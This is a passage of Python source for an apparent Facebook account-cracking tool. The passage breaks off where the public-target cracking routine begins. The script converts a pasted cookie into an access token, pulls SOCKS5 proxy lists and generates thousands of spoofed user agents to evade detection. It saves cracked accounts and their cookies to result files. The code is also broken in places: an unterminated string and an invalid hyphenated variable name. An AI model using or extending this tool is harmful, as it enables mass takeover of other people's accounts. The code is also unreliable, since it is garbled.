
#-----------------[ IMPORT-MODULE ]-------------------#

def modules():
	print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHECKING FOR UPDATES \x1b[37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import requests
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m REQUESTS IS BEING INSTALLED \x1b[37m")
		os.system('pip install requests --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m BS4 IS BEING INSTALLED \x1b[37m")
		os.system('pip install bs4 --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import rich
	except ModuleNotFoundError:
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m RICH IS BEING INSTALLED \x1b[37m")
		os.system('pip install rich --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	exit()

try:
	import requests as req, re,time,os
	from bs4 import BeautifulSoup as par
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#

version='OPEN SOURCE'
file_name=[]
ugen2=[]
logincookie=[]
cekap=[]
askc=[]
scp= 'n'
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]


#------------------[ PROXY ]-------------------#

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass 
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/harryexeee')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#

logo=("""     ____  __._______    ___________________         _____  
|    |/ _|\      \  /   _____/\______   \___  __/  |  | 
|      <  /   |   \ \_____  \  |       _/\  \/ /   |  |_
|    |  \/    |    \/        \ |    |   \ \   /    ^   /
|____|__ \____|__  /_______  / |____|_  /  \_/\____   | 
        \/       \/        \/         \/           |__| 
def info():
	print(f"""\x1b[37m----------------------------------------------
 AUTHOR     : RAM DON
 GITHUB     : RK-BRAND
 FACEBOOK   : RK BRAND
 VERSION    : \x1b[37m\x1b[38;5;196m{version}\x1b[37m
\x1b[37m----------------------------------------------""")
def banner():
	print(logo)

#------------------[ ACCOUNT CREATION DATE]-----------------#

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:4] in ['6155']            :tahunz = '2024'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
        linex()
        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()

#--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	banner()
	info()
	print(""" \x1b[38;5;196m>>\x1b[37m USE DATR COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m LOGIN USING COOKIE """)
	print(""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m JOIN GROUPS  """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '0':
		groups()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({
	                    'Accept-Language': 'id,en;q=0.9',
	                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	                    'Referer': 'https://www.instagram.com/',
	                    'Host': 'www.facebook.com',
	                    'Sec-Fetch-Mode': 'cors',
	                    'Accept': '*/*',
						'Connection': 'keep-alive',
	                    'Sec-Fetch-Site': 'cross-site',
	                    'Sec-Fetch-Dest': 'empty',
	                    'Origin': 'https://www.instagram.com',
	                    'Accept-Encoding': 'gzip, deflate',
	                })
					response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m {greeting}{uname} ")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")
	linex()
	print(f""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CRACK PUBLIC       \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m RESET DETAILS""")
	print(f""" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CRACK FILE         \x1b[38;5;196m[\x1b[37m5\x1b[38;5;196m]\x1b[37m CONTACT ADMIN""")
	print(f""" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m CHECK RESULTS      \x1b[38;5;196m[\x1b[37m6\x1b[38;5;196m]\x1b[37m COMMAND GROUPS""")
	print(f""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m LOGOUT MENU""")
	linex()
	_____RK-BRAND_____ = input(' CHOOSE : ')
	if _____RK-BRAND_____ in ['1']:
		harry_public()
	elif _____RK-BRAND_____ in ['2']:
		fileopt()
	elif _____RK-BRAND_____ in ['3','03']:
		passask()
		harryresults()
	elif _____RK-BRAND_____ in ['4','04']:
		passask()
		os.system('rm -rf data/password.xml')
		os.system('rm -rf data/name.xml')
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m RESET DONE')
		restart()
	elif _____RK-BRAND_____ in ['5','05']:
		contact()
	elif _____RK-BRAND_____ in ['0']:
		passask()
		os.system('rm -rf data/.token.txt')
		os.system('rm -rf data/.cok.txt')
		linex()
		animation(' [✓] DONE LOGOUT ')
		exit()
	elif _____RK-BRAND____ in ['6']:
		groups()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()

#-----------------[ HASIL-CRACK ]-----------------#

def harryresults():
    ok_file_path = '/sdcard/RK-BRANDv4/RK-BRANDv4-OK.txt'
    cp_file_path = '/sdcard/RK-BRANDv4/RK-BRANDv4-CP.txt'

    if not (os.path.exists(ok_file_path) and os.path.exists(cp_file_path)):
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m NO IDS SAVED")
        return
    linex()
    print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m CHECK OK IDS \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m CHECK CP IDS")
    linex()
    user_choice = input(" CHOOSE : ")

    if user_choice == '1':
        linex()
        show_cookies = input(" \x1b[38;5;196m[\x1b[37m>\x1b[38;5;196m]\x1b[37m SHOW COOKIES (y/n): ").lower() == 'y'
        linex()
        process_file(ok_file_path, show_cookies)
    elif user_choice == '2':
        linex()
        process_file(cp_file_path, show_cookies=False)
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID CHOICE ")

def process_file(file_path, show_cookies):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    for i, line in enumerate(lines, start=1):
        parts = line.strip().split('|')
        if show_cookies:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m  {parts[0]} • {parts[1]}")
            kuki = parts[2]
            print(f" [🍪] {kuki}")
        else:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m {parts[0]} | {parts[1]}")
    linex()
    input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO EXIT ");restart()

#-----------------[ CONTACT ]-----------------#

def contact():
	os.system('xdg-open https://www.facebook.com/harryexe')

#-------------------[ GROUPS ]----------------#

def groups():
	linex()
	print("OPEN SOURCE VERSION")

#-------------------[ CRACK-PUBLIK ]----------------#

def harry_public():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TARGET
